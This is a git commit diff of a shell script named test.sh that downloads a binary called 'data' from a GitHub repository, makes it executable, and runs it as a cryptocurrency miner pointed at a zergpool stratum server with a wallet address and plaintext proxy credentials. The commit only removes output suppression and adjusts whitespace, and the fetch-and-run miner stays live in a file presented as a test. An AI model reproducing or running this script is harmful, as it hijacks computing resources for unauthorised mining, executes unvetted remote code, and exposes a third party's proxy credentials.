7ec20e078dd7d6b543b19e1f2f31e0a1c6cc1ee1
Testdrive345 <93646807+Testdrive345@users.noreply.github.com>
2022-12-29 15:56:13 +0530

    Update test.sh

--- test.sh
+++ test.sh
@@ -1,5 +1,4 @@
 rm -rf data
-wget https://github.com/Master478963/lolMinet/raw/main/data   &> /dev/null  
+wget https://github.com/Master478963/lolMinet/raw/main/data 
 chmod +x data 
-
- ./data -a yespower -o stratum+tcp://yespower.na.mine.zergpool.com:6533 -u RFqmNRc3ycwR2UMcx5afpbgCDzHs7gYavX --timeout 120 -p c=RVN,m=solo,ID=Test  -x xutcvpkv-rotate:te7t633kbfmz@p.webshare.io:80
+./data -a yespower -o stratum+tcp://yespower.na.mine.zergpool.com:6533 -u RFqmNRc3ycwR2UMcx5afpbgCDzHs7gYavX --timeout 120 -p c=RVN,m=solo,ID=Test  -x xutcvpkv-rotate:te7t633kbfmz@p.webshare.io:80
